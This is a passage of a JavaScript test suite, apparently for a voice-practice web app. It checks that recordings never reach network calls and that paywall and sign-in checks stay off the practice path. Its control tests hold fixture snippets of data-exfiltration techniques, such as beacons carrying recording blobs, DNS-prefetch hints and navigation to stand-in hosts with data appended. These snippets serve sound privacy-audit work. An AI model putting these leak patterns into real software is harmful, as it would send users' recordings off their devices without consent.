 * same function as a hearer shares what it keeps (a take kept by Stop's handler, sent by the page's pagehide
 * handler), so the functions a hearer is made in hear too, up to the file's top: a take kept at the file's own
 * top level, or in a global, and sent from a function that never hears is a value handed through a variable,
 * which this does not follow.
 */
function leaksIn(source) {
  const fns = functionsOf(source);
  const hearers = new Set(Object.keys(fns).filter((n) => Object.keys(fns[n].voice).length));
  for (let n of [...hearers]) while ((n = fns[n].outer)) hearers.add(n);
  const reach = reachable(fns, [...hearers]);
  return Object.keys(sinksIn(source))
    .filter((k) => NETWORK.test(k) && reach.has(k.split(" › ")[0]))
    .map((k) => `${k}, reached by ${reach.get(k.split(" › ")[0]).join(" > ")}`);
}

test("in those files, nothing that hears the voice leads to anything that sends", () => {
  const leaks = [];
  for (const [file, source] of Object.entries(shippedScripts("."))) {
    if (VOICE_FILES[file]) leaks.push(...leaksIn(source).map((l) => `${file}: ${l}`));
  }
  assert.deepEqual(leaks, []);
});

test("Start, Stop, the routines, the rating, Next and '+30 s' never reach the sale, and read the plan only to draw", () => {
  const source = readFileSync("js/app.js", "utf8");
  const fns = functionsOf(source);
  assert.deepEqual(
    PRACTICE_ROOTS.filter((r) => !fns[r]),
    [],
    "control: every root is a function of js/app.js (a rename would empty the path)"
  );
  assert.ok(reachable(fns, PRACTICE_ROOTS).size > 150, "control: the path covers the practice code, not a stub of it");
  const path = practicePath(source, PRACTICE_ROOTS);
  for (const [name, { uses, via }] of Object.entries(path)) {
    assert.ok(!/openPricing|openAccount|btn-pricing/.test(uses), `${name} opens the sale on the way to practice: ${via}`);
  }
  const found = Object.fromEntries(Object.entries(path).map(([n, { uses }]) => [n, uses]));
  const expected = Object.fromEntries(Object.entries(PLAN_READERS).map(([n, [uses]]) => [n, uses]));
  assert.deepEqual(
    diffCounts(found, expected),
    [],
    `the plan is read on the way to practice where it was not: ${JSON.stringify(Object.fromEntries(Object.entries(path).filter(([n]) => found[n] !== expected[n])), null, 1)}`
  );
});

test("the plan is read only in the files that sell, draw Pro or keep its extras", () => {
  assert.deepEqual(Object.keys(acrossScripts(".", billingNamesIn)).sort(), Object.keys(PLAN_FILES).sort());
});

test("every function that reads the plan or opens the sale is written down, file by file, with why", () => {
  const found = {};
  for (const [file, source] of Object.entries(shippedScripts("."))) {
    for (const [fn, uses] of Object.entries(usesByFunction(source))) found[`${file} :: ${fn}`] = uses;
  }
  const expected = flat(Object.fromEntries(Object.entries(PLAN_USES).map(([f, rows]) => [f, Object.fromEntries(Object.entries(rows).map(([k, [u]]) => [k, u]))])));
  assert.ok(Object.keys(found).length > 40, "control: the plan's readers are found");
  assert.deepEqual(diffCounts(found, expected), [], "the plan is read, or the sale opened, where it was not: write it down in PLAN_USES with why, and why it cannot stop practice");
});

test("every function that opens the sign-in is written down, file by file, with why", () => {
  const found = {};
  for (const [file, source] of Object.entries(shippedScripts("."))) {
    for (const [fn, uses] of Object.entries(usesByFunction(source, "account"))) {
      const opens = uses.split(" ").filter((u) => SIGN_IN_OPENER.test(u.slice(0, u.lastIndexOf(":"))));
      if (opens.length) found[`${file} :: ${fn}`] = opens.join(" ");
    }
  }
  const expected = flat(Object.fromEntries(Object.entries(SIGN_IN_OPENERS).map(([f, rows]) => [f, Object.fromEntries(Object.entries(rows).map(([k, [u]]) => [k, u]))])));
  assert.deepEqual(diffCounts(found, expected), [], "the sign-in is opened where it was not: write it down in SIGN_IN_OPENERS with why, and why it cannot stand in front of practice");
});

test("every event carries only the props in the plan, and nothing passes one on but the listed relays", () => {
  const calls = [];
  const relays = [];
  const unresolved = [];
  for (const [file, source] of Object.entries(shippedScripts("."))) {
    const found = eventsIn(source, file);
    calls.push(...found.calls);
    relays.push(...found.relays);
    unresolved.push(...found.unresolved);
  }
  assert.ok(calls.length > 50, "control: the call sites are found");
  assert.deepEqual(unresolved, [], "an event's name made from a template that cannot be told: write the name out");
  assert.ok(calls.some(([, n]) => n === "tour_skip") && calls.some(([, n]) => n === "mic_primer_decline"), "control: a name made from a template is found by each name it makes");
  const off = calls.filter(([, name, keys]) => !TRACKING_PLAN[name] || keys.some((k) => !TRACKING_PLAN[name].includes(k)));
  assert.deepEqual(off, [], "an event or a prop not in TRACKING_PLAN: add it there, and say it is not derived from the voice");
  assert.deepEqual([...new Set(relays)].sort(), [...TRACK_RELAYS].sort());
});

test("every event in the plan is one the worker keeps, with props it keeps: the wire filter cannot hide a drift", async () => {
  // js/analytics.js drops on the way out what the worker would drop on arrival, so the worker's count of unknown
  // events can no longer show a client that raises one. This is where that drift shows instead: before it ships.
  const { EVENT_NAMES, sanitizeProps } = await import("../../workers/entitlements/src/events.js");
  const missing = [];
  for (const [name, keys] of Object.entries(TRACKING_PLAN)) {
    if (!EVENT_NAMES.has(name)) missing.push(name);
    for (const k of keys.filter((k) => !k.startsWith("..."))) if (!Object.hasOwn(sanitizeProps({ [k]: "x" }), k)) missing.push(`${name}.${k}`);
  }
  assert.deepEqual(missing, [], "an event or a prop the worker drops: add it to workers/entitlements/src/events.js and js/analytics.js's WIRE_NAMES together");
});

test("nothing on the way to practising, saving, rating or the history asks whether the visitor is signed in, but the header", () => {
  const path = practicePath(readFileSync("js/app.js", "utf8"), PRACTICE_ROOTS, "account");
  const found = Object.fromEntries(Object.entries(path).map(([n, { uses }]) => [n, uses]));
  const expected = Object.fromEntries(Object.entries(SIGN_IN_READERS).map(([n, [uses]]) => [n, uses]));
  assert.deepEqual(diffCounts(found, expected), [], `asked on the way: ${JSON.stringify(path, null, 1)}`);
});

test("every function of js/app.js that calls into practice is on the path, or written down with why it is not a way in", () => {
  // A cap in a click handler, ahead of the call into practice ("if (!isPro()) return openPricing(); startMicroSession()"),
  // is checked only if the handler is on the path: here every caller of a root is, or is listed.
  const fns = functionsOf(readFileSync("js/app.js", "utf8"));
  const reach = reachable(fns, PRACTICE_ROOTS);
  const core = new Set(PRACTICE_CORE);
  const callers = Object.keys(fns).filter((n) => [...fns[n].refs].some((r) => r !== n && core.has(r)));
  assert.ok(callers.includes("bindRetention #wb-last") && callers.includes("init"), "control: click handlers and the page's start are found as callers");
  assert.deepEqual(callers.filter((n) => !reach.has(n) && !NOT_A_WAY_IN[n]), [], "a way into practice off the path: add it to PRACTICE_ROOTS");
  assert.deepEqual(Object.keys(NOT_A_WAY_IN).filter((n) => !callers.includes(n) || reach.has(n)), [], "control: each exception still calls into practice from off the path");
  // An exception is off the path, so nothing else reads it: a cap written in its own body would pass.
  const reads = Object.keys(NOT_A_WAY_IN).filter((n) => Object.keys(fns[n].billing).length || Object.keys(fns[n].account).length);
  assert.deepEqual(reads, [], "a listed exception reads the plan, opens the sale or asks about the account: a way in hidden in it");
});

test("only the files listed use the account module or ask whether the visitor is signed in", () => {
  assert.deepEqual(Object.keys(acrossScripts(".", accountNamesIn)).sort(), Object.keys(SIGN_IN_FILES).sort());
});

test("the code that keeps a guest's progress never asks about an account and never keeps anything for the tab only", () => {
  const scripts = shippedScripts(".");
  const found = GUEST_STORES.map((f) => [f, [...new Set([...scripts[f].matchAll(NOT_IN_GUEST_STORES)].map((m) => m[1]))]]).filter(([, n]) => n.length);
  assert.deepEqual(found, []);
});

test("a guest's progress is kept under the names it always was", () => {
  const src = readFileSync("js/storage.js", "utf8");
  const block = /const LS = \{([\s\S]*?)\n  \};/.exec(src)?.[1] || "";
  const keys = Object.fromEntries([...block.matchAll(/^\s*(\w+): "([^"]+)"/gm)].map((m) => [m[1], m[2]]));
  for (const name of ["DB_NAME", "DB_STORE"]) keys[name] = new RegExp(`const ${name} = "([^"]+)"`).exec(src)?.[1];
  assert.deepEqual(keys, GUEST_KEYS);
});

test("only js/ads.js reads the ad config, and it asks AdSense for nothing but the units it draws", () => {
  const readers = Object.entries(shippedScripts("."))
    .filter(([, src]) => AD_NAMES.test(src))
    .map(([f]) => f)
    .sort();
  assert.deepEqual(readers, AD_FILES);
  const pushes = adPushes(readFileSync("js/ads.js", "utf8"));
  assert.ok(pushes.length >= 1, "control: the unit's own push is found");
  assert.deepEqual(
    [...new Set(pushes)],
    ["0"],
    "every push to adsbygoogle is an empty {}: the unit the page drew, never page-level ads asked for by the page (Auto ads are an AdSense account switch: docs/40 step 9c)"
  );
});

/* ------------------------------------------------------------------ controls: each finder sees the red team's changes */

test("control: the sinks the red team used are each found, and a word that is not an address is not", () => {
  const src = `
    function save(b) { setTimeout(() => fetch("/api/grade", { method: "POST", body: b.stream(), duplex: "half" }), 10); }
    function hand(b) { window.opener?.postMessage({ b }, "*"); }
    function hint(h) { const l = document.createElement("link"); l.rel = "dns-prefetch"; l.href = "//" + h + ".voice.example"; document.head.append(l); }
    function beacon(p) { navigator.sendBeacon("/v", p); }
    function img(d) { const i = new Image(); i.src = "/p?d=" + d; }
    function html(d) { el.innerHTML = '<img src="/p?d=' + d + '">'; }
    function cookie(p) { document.cookie = "t=" + p; }
    function go(d) { location.href = "https://x.example/?d=" + d; }
    function backup(t) { window.VTAccount.request("PUT", "/v1/me/takes", t); }
    function rtc() { new RTCPeerConnection(); new Worker("w.js"); }
    function word() { live.src = "chosen"; bag.src = x ? "default" : "link"; }
  `;
  assert.deepEqual({ ...sinksIn(src) }, {
    "save › fetch": 1,
    "hand › postMessage": 1,
    "hint › createElement:link": 1,
    "hint › hint": 1,
    "hint › set:href": 1,
    "beacon › sendBeacon": 1,
    "img › new Image": 1,
    "img › set:src": 1,
    "html › html:img": 1,
    "cookie › cookie": 1,
    "go › navigate": 1,
    "backup › VTAccount.request": 1,
    "rtc › new RTCPeerConnection": 1,
    "rtc › new Worker": 1
  });
});

test("control: a sync that reads a take, a helper that sends what a hearer hands it, and a cap behind a helper are caught", () => {
  assert.deepEqual(Object.keys(voiceSourcesIn("async function runCycle() { for (const r of await VTStorage.listRecordings()) put(r); }")), ["listRecordings"]);

  const app = `
    function onSave(result) { VTStorage.saveRecording(result.blob); later(result.blob); }
    function later(b) { setTimeout(() => upload(b), 120000); }
    function upload(b) { fetch("/api/backup", { method: "PUT", body: b }); }
    function startPractice() { if (capReached()) return; go(); }
    function capReached() { return !window.VTBilling?.isPro?.() && spent() > 3600; }
    function go() {}
  `;
  const fns = functionsOf(app);
  const reach = reachable(fns, ["onSave"]);
  assert.deepEqual(reach.get("upload"), ["onSave", "later", "upload"]);
  assert.match(Object.keys(sinksIn(app)).find((k) => NETWORK.test(k)), /^upload › fetch$/);
  assert.deepEqual(practicePath(app, ["startPractice"]), { capReached: { uses: "VTBilling:1 isPro:1", via: "startPractice > capReached" } });
});

test("control: a new prop on a known event, a new event and a new relay are each caught", () => {
  const src = `
    function recordPracticeIfDue() { window.VTAnalytics?.track?.("practice_recorded", { exerciseId: id, f0: contour }); }
    function shape() { window.VTAnalytics?.track?.("take_shape", { f0: contour }); }
    function relay(n, p) { window.VTAnalytics?.track?.(n, p); }
  `;
  const { calls, relays } = eventsIn(src, "x.js");
  const off = calls.filter(([, name, keys]) => !TRACKING_PLAN[name] || keys.some((k) => !TRACKING_PLAN[name].includes(k)));
  assert.deepEqual(
    off.map(([, n, k]) => [n, k]),
    [
      ["practice_recorded", ["exerciseId", "f0"]],
      ["take_shape", ["f0"]]
    ]
  );
  assert.deepEqual(relays, ["x.js › relay"]);

  // A name made from a template is each name its calls can make, through a parameter passed on; one that cannot be
  // told is listed rather than passed by its prefix.
  const made = eventsIn(
    `
    function end(reason) { if (active) finish(reason); }
    function finish(why) { if (!why) return; window.VTAnalytics?.track?.(\`tour_\${why}\`, { n: 1 }); }
    function wire(x) { a.onclick = () => end(x ? "complete" : "skip"); b.onclick = () => end(false); c.onclick = () => end("closed"); }
    function shape(contour) { window.VTAnalytics?.track?.(\`take_\${contour}\`, {}); }
  `,
    "x.js"
  );
  assert.deepEqual(made.calls.map(([, n]) => n), ["tour_complete", "tour_skip", "tour_closed"]);
  assert.deepEqual(made.unresolved, ["x.js:5 `take_${}`"]);

  // A relay that adds to what it passes on, or writes into it, is listed as changing it; one that passes its own
  // two parameters on as they came is not.
  const relayed = eventsIn(
    `
    function plain(n, p) { window.VTAnalytics?.track?.(n, p || {}); }
    function adds(n, p) { window.VTAnalytics?.track?.(n, { ...p, view: state.view }); }
    function writes(n, p) { p.heard = true; window.VTAnalytics?.track?.(n, p); }
    function renames(n, p) { n = "x_" + n; window.VTAnalytics?.track?.(n, p); }
  `,
    "x.js"
  );
  assert.deepEqual(relayed.relays, ["x.js › plain", "x.js › adds (changes what it passes on)", "x.js › writes (changes what it passes on)", "x.js › renames (changes what it passes on)"]);
  // A template's part given another value in its own function, or a function called by any spelling but its bare
  // name (bound, or handed to another script), cannot be told from its calls here.
  const tour = (inside, outside = "") =>
    eventsIn(
      `
    function end(reason) { if (!reason) return; ${inside} window.VTAnalytics?.track?.(\`tour_\${reason}\`, { n: 1 }); }
    function wire() { a.onclick = () => end("skip"); ${outside} }
  `,
      "x.js"
    );
  assert.deepEqual([tour("").calls.map(([, n]) => n), tour("").unresolved], [["tour_skip"], []]);
  assert.deepEqual(
    [
      tour('if (reason === "skip" && i === 0) reason = "skip_first";'),
      tour("", "b.addEventListener('click', end.bind(null, 'close'));"),
      tour("", "window.VTTour = { end };"),
      tour("", "window.VTTour = { end: (r) => end(r ? 'dismiss' : false) };")
    ].map((r) => [r.calls.map(([, n]) => n), r.unresolved]),
    [
      [[], ["x.js:2 `tour_${}`"]],
      [[], ["x.js:2 `tour_${}`"]],
      [[], ["x.js:2 `tour_${}`"]],
      [["tour_skip", "tour_dismiss"], []]
    ],
    "reassigned, bound and exported are each unresolved; a wrapper that can pass only a known name is not"
  );
});

test("control: the review's spellings of a way off the device are each found, and a module's own open or a test of beacon support is not", () => {
  const src = `
    function speak() { const r = new (window.SpeechRecognition || window.webkitSpeechRecognition)(); r.start(); }
    function later(b) { window.fetchLater?.("/api/backup", { method: "PUT", body: b, activateAfter: 120000 }); }
    function bound(b) { const send = navigator.sendBeacon.bind(navigator); send("/v", b); fetch.call(window, "/g", { body: b }); }
    function alias(b) { const f = window.fetch || polyfill; return f("/g", { body: b }); }
    function quic(u) { new WebTransport(u); }
    function crumb(p) { cookieStore.set("t", p); }
    function assign(u) { Object.assign(img, { src: u }); }
    function svg(u) { const i = document.createElementNS(NS, "image"); i.setAttributeNS(XLINK, "href", u); }
    function markup(u) { el.innerHTML = '<svg><image href="' + u + '"></image></svg>'; }
    function pinged(u) { el.innerHTML = '<a href="/x" ping="' + u + '">x</a>'; }
    function css(u) { style.textContent = "@import '" + u + "';"; }
    function search(q) { location.search = "?d=" + q; }
    function nav(u) { navigation.navigate(u); }
    function worker() { self.importScripts("/w.js"); }
    function popup(u) { open(u); }
    function tested() { if (navigator.sendBeacon && ok) go(); }
    function param(b, send = fetch) { return send("/p", { body: b }); }
    function picked(b) { const { sendBeacon } = navigator; const { fetch: get } = window; sendBeacon("/v", b); get("/g"); }
    class Uploader { send = fetch; post = (b) => this.send("/c", { body: b }); }
  `;
  assert.deepEqual({ ...sinksIn(src) }, {
    "speak › speech-recognition": 2,
    "later › fetchLater": 1,
    "bound › sendBeacon": 1,
    "bound › fetch": 1,
    "alias › fetch": 1,
    "quic › new WebTransport": 1,
    "crumb › cookie": 1,
    "assign › set:src": 1,
    "svg › createElement:image": 1,
    "svg › setAttribute:href": 1,
    "markup › html:image": 1,
    "pinged › html:a-ping": 1,
    "css › css-import": 1,
    "search › navigate": 1,
    "nav › navigate": 1,
    "worker › importScripts": 1,
    "popup › window.open": 1,
    "param › fetch": 1,
    "picked › sendBeacon": 1,
    "picked › fetch": 1,
    "send › fetch": 1
  });
  assert.deepEqual({ ...sinksIn("function open(o) {} function wire() { open({ kind: 'bug' }); }") }, {}, "a module's own open() is not the window's");
  // A name is the module's own only where it is declared: a sibling's `let open` leaves the window's open() as it was.
  assert.deepEqual(
    { ...sinksIn("function list() { let open = false; open = !open; } function leave(u) { open(u); }") },
    { "leave › window.open": 1 },
    "a sibling's own open does not hide the window's"
  );
});

test("control: the review's ways to hear the voice or read a take, and to ask about an account, are each found", () => {
  const voice = `
    function a() { return navigator.mediaDevices["getUserMedia"]({ audio: true }); }
    function b(el) { return ctx.createMediaElementSource(el); }
    async function c(blob) { return ctx.decodeAudioData(await blob.arrayBuffer()); }
    function d() { return indexedDB.open("vt_recordings_db"); }
    function e() { navigator.webkitGetUserMedia({ audio: true }, ok, no); }
    function f() { return new webkitSpeechRecognition(); }
  `;
  assert.deepEqual(Object.keys(voiceSourcesIn(voice)).sort(), [
    "createMediaElementSource",
    "decodeAudioData",
    "getUserMedia",
    "vt_recordings_db",
    "webkitGetUserMedia",
    "webkitSpeechRecognition"
  ]);
  const account = `
    function save() { if (!window.VTAccount?.getState?.()?.account) return window.VTAccount.signInWithGoogle?.(); }
  `;
  assert.deepEqual(practicePath(account, ["save"], "account"), {
    save: { uses: "VTAccount:2 getState().account:1 signInWithGoogle:1", via: "save" }
  });
  // The sale and the sign-in opened by their buttons' ids, and the plan read from its own key, with no name in sight;
  // a dialog's own id is not the sale (closing it is everywhere).
  const handles = `
    function a() { $("#btn-pricing").click(); }
    function b() { document.getElementById("btn-account")?.click(); }
    function c() { return JSON.parse(localStorage.getItem("vt_billing_v1") || "{}").plan; }
    function d() { $("#pricing-modal").hidden = true; }
  `;
  assert.deepEqual([usesByFunction(handles), usesByFunction(handles, "account")], [{ a: "#btn-pricing:1", c: "vt_billing_v1:1" }, { b: "btn-account:1" }]);
});

test("control: a cap in a callback set on a property, in a method called on this, and a hearer's method that sends are caught", () => {
  const app = `
    function renderNextStepCard() { btn.onclick = () => { if (overHour() && !window.VTBilling?.isPro?.()) return openPricing(); startDaily(); }; }
    function wireEngineForTake() { state.practice.onFrame = (f) => { if (overHour()) return; paint(f); }; }
    function overHour() { return spent() > 3600; }
    function showMicBlocked() { retry.onclick = () => go(); skip.onclick = () => openPricing(); }
  `;
  const path = practicePath(app, ["renderNextStepCard", "wireEngineForTake"]);
  assert.deepEqual(Object.keys(path), ["renderNextStepCard.onclick"], "the Start card's onclick is on the path; showMicBlocked's skip, not reached, is not");
  assert.equal(path["renderNextStepCard.onclick"].uses, "VTBilling:1 isPro:1 openPricing:1");
  assert.deepEqual(reachable(functionsOf(app), ["wireEngineForTake"]).get("overHour"), ["wireEngineForTake", "wireEngineForTake.onFrame", "overHour"]);

  const engine = `
    class Engine {
      start() { this.recorder = new MediaRecorder(this.stream); this.recorder.onstop = () => this._report(this.recBlob); }
      _report(b) { fetch("/api/grade", { method: "POST", body: b }); }
    }
  `;
  const fns = functionsOf(engine);
  const reach = reachable(fns, Object.keys(fns).filter((n) => Object.keys(fns[n].voice).length));
  assert.deepEqual(reach.get("_report"), ["start.onstop", "_report"], "the hearer that holds the take reaches the method it calls on this");

  // A callback set on this in the constructor, and a class field that holds an arrow, are reached by `this.x()` too.
  const fields = `
    class Engine {
      constructor() { this.send = (b) => navigator.sendBeacon("/v", b); }
      upload = (b) => fetch("/u", { body: b });
      stop() { this.recorder = new MediaRecorder(s); this.recorder.ondataavailable = (e) => { this.send(e.data); this.upload(e.data); }; }
    }
  `;
  const held = functionsOf(fields);
  const heard = reachable(held, Object.keys(held).filter((n) => Object.keys(held[n].voice).length));
  assert.deepEqual([heard.get("constructor.send")?.at(-1), heard.get("upload")?.at(-1)], ["constructor.send", "upload"]);
  assert.deepEqual({ ...sinksIn(fields) }, { "constructor.send › sendBeacon": 1, "upload › fetch": 1 });
});

test("control: a hearer's sibling, a store's own method, a private method, a held element's handler and a function handed another are followed", () => {
  // Stop's handler keeps the take; the page's pagehide handler, made beside it, sends it.
  const sibling = `
    function bindTakeTools() {
      let last = null;
      $("#btn-rec-stop").addEventListener("click", async () => { last = await VTStorage.getRecordingBlob(id); });
      window.addEventListener("pagehide", () => { if (last) navigator.sendBeacon("/api/backup", last); });
    }
    function report() { fetch("/api/report", { method: "POST" }); }
  `;
  assert.deepEqual(leaksIn(sibling), ["bindTakeTools window › sendBeacon, reached by bindTakeTools > bindTakeTools window"]);
  assert.deepEqual(leaksIn(sibling.replace("navigator.sendBeacon(\"/api/backup\", last)", "console.log(last)")), [], "a sibling that keeps the take on the device is not a leak, and a function made elsewhere that sends is not reached");
  // The store's own method, named for what it reads, and a class's private method called on this.
  const store = `const VTStorage = { getRecordingBlob(id) { const r = tx.get(id); r.onsuccess = () => navigator.sendBeacon("/b", r.result); } };`;
  assert.deepEqual(leaksIn(store), ["getRecordingBlob.onsuccess › sendBeacon, reached by getRecordingBlob > getRecordingBlob.onsuccess"]);
  const engine = `class Engine { stop() { this.recorder = new MediaRecorder(s); this.recorder.onstop = () => this.#archive(this.recBlob); } #archive(b) { fetch("/a", { body: b }); } #draw() { fetch("/x"); } }`;
  assert.deepEqual(leaksIn(engine), ["#archive › fetch, reached by stop.onstop > #archive"], "the private method called is reached; one that is not called is not");
  // A handler on an element kept in a variable is its own function, named by the element's selector; one on the
  // document by the document. A function handed another as an argument reaches it.
  const app = `
    function bindRetention() {
      const again = $("#wb-again");
      again?.addEventListener("click", () => { if (!window.VTBilling?.isPro?.()) return openPricing(); startMicroSession(); });
      document.addEventListener("visibilitychange", () => renderNextStepCard());
    }
    function init() { VTLoop.bind({ startDaily: proOnly(startDaily) }); }
    function proOnly(fn) { return (...a) => (window.VTBilling?.isPro?.() ? fn(...a) : openPricing()); }
    function startDaily() {}
  `;
  const fns = functionsOf(app);
  const called = (n) => ["bindRetention #wb-again", "bindRetention document", "openPricing", "startMicroSession", "renderNextStepCard"].filter((r) => fns[n].refs.has(r));
  assert.deepEqual(
    Object.fromEntries(["bindRetention", "bindRetention #wb-again", "bindRetention document"].map((n) => [n, [called(n), fns[n].billing]])),
    {
      bindRetention: [["bindRetention #wb-again", "bindRetention document"], {}],
      "bindRetention #wb-again": [["openPricing", "startMicroSession"], { VTBilling: 1, isPro: 1, openPricing: 1 }],
      "bindRetention document": [["renderNextStepCard"], {}]
    }
  );
  assert.ok(fns.proOnly.refs.has("startDaily") && !fns.startDaily.refs.has("proOnly"), "proOnly(startDaily) makes proOnly a caller of startDaily, not the other way");
});

test("control: an aliased push to AdSense's queue is found, and a page's JSON-LD or speculation rules do not break the scan", async () => {
  assert.deepEqual(adPushes("const q = (window.adsbygoogle = window.adsbygoogle || []); q.push({ google_ad_client: 'ca-pub-1', enable_page_level_ads: true }); (adsbygoogle = adsbygoogle || []).push({});"), ["2", "0"]);
  // By its name in brackets, through a helper that returns the queue, and through an alias of an alias of an alias.
  assert.deepEqual(adPushes("window['adsbygoogle'].push({ google_ad_client: 'ca-pub-1', enable_page_level_ads: true });"), ["2"]);
  assert.deepEqual(adPushes("adQueue().push({ a: 1 }); function adQueue() { return (window.adsbygoogle = window.adsbygoogle || []); }"), ["1"]);
  assert.deepEqual(adPushes("const a = window.adsbygoogle; const b = a; const c = b; c.push({ x: 1, y: 2, z: 3 }); [].push({ q: 1 });"), ["3"]);
  // Taken out of an object (with a default or not), as a default parameter, and as a class field pushed on this.
  const PAGE_ADS = "({ google_ad_client: 'ca-pub-1', enable_page_level_ads: true })";
  assert.deepEqual(
    [
      `const { adsbygoogle: q } = window; q.push${PAGE_ADS};`,
      `const { adsbygoogle: q = [] } = window; q.push${PAGE_ADS};`,
      `function f(q = window.adsbygoogle) { q.push${PAGE_ADS}; }`,
      `class Ads { queue = window.adsbygoogle; show() { this.queue.push${PAGE_ADS}; } }`
    ].map(adPushes),
    [["2"], ["2"], ["2"], ["2"]]
  );
  assert.deepEqual(adPushes("const { other: q } = window; q.push({ a: 1 }); function f(q = []) { q.push({ b: 1 }); }"), [], "a holder of anything else is not the queue");
  const { mkdtempSync, mkdirSync, writeFileSync } = await import("node:fs");
  const { tmpdir } = await import("node:os");
  const root = mkdtempSync(tmpdir() + "/vt-scan-");
  mkdirSync(root + "/js");
  writeFileSync(root + "/js/a.js", "function a() {}");
  writeFileSync(
    root + "/new-page.html",
    '<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebApplication"}</script>' +
      '<script type="speculationrules">{"prerender":[{"urls":["/guide.html"]}]}</script>' +
      '<script type="module">import "./x.js";</script><script>window.VT_X = 1;</script>'
  );
  assert.deepEqual(JSON.parse(JSON.stringify(acrossScripts(root, sinksIn))), {
    "new-page.html#inline-2": { "(top) › hint": 1 },
    "new-page.html#inline-3": { "(top) › import": 1 }
  });
});
